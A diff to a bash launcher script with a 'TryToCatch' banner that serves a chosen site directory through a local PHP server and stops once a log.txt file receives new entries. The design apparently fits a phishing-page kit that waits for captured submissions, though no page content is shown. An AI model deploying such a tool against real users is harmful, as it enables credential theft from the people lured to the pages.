@@ -2,15 +2,17 @@
 
 HOST="127.0.0.1"
 PORT=8080
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+LOG_FILE="$SCRIPT_DIR/log.txt"
 
 start() {
     cat << 'EOF'
-  ______          ______      ______      __       __  
- /_  __/______  _/_  __/___  / ____/___ _/ /______/ /_ 
+  ______          ______      ______      __       __
+ /_  __/______  _/_  __/___  / ____/___ _/ /______/ /_
   / / / ___/ / / // / / __ \/ /   / __ `/ __/ ___/ __ \
  / / / /  / /_/ // / / /_/ / /___/ /_/ / /_/ /__/ / / /
-/_/ /_/   \__, //_/  \____/\____/\__,_/\__/\___/_/ /_/ 
-         /____/                                        
+/_/ /_/   \__, //_/  \____/\____/\__,_/\__/\___/_/ /_/
+         /____/
 EOF
 }
 
@@ -27,6 +29,7 @@ declare -A SITE_PATHS=(
 )
 
 CHOSEN_DIR=""
+PHP_PID=""
 
 choose_site() {
     echo ""
@@ -60,6 +63,25 @@ choose_site() {
     done
 }
 
+watch_log() {
+    local last_size
+    last_size=$(wc -c < "$LOG_FILE" 2>/dev/null || echo 0)
+
+    while true; do
+        sleep 1
+        local current_size
+        current_size=$(wc -c < "$LOG_FILE" 2>/dev/null || echo 0)
+
+        if [[ "$current_size" -gt "$last_size" ]]; then
+            echo ""
+            echo "Done"
+            echo "Path: $LOG_FILE"
+            kill "$PHP_PID" 2>/dev/null
+            exit 0
+        fi
+    done
+}
+
 run_php_server() {
     local site_dir="$1"
     cd "$site_dir" || exit 1
@@ -70,19 +92,21 @@ run_php_server() {
     echo "Ctrl+C to stop"
     echo ""
 
-php -S "$HOST:$PORT" > /dev/null 2>&1 &
+    php -S "$HOST:$PORT" > /dev/null 2>&1 &
     PHP_PID=$!
 
-    trap 'echo -e "\nStopping..."; kill "$PHP_PID" 2>/dev/null; wait "$PHP_PID" 2>/dev/null; echo "Stopped"; exit 0' INT
+    watch_log &
+
+    trap 'echo ""; echo "Stopping..."; kill "$PHP_PID" 2>/dev/null; exit 0' INT
 
     wait "$PHP_PID"
 }
 
-saving_file() {
-    echo "Saved to log.txt"
-}
-
 start
+
+if [[ ! -f "$LOG_FILE" ]]; then
+    touch "$LOG_FILE"
+fi
+
 choose_site
 run_php_server "$CHOSEN_DIR"
-saving_file
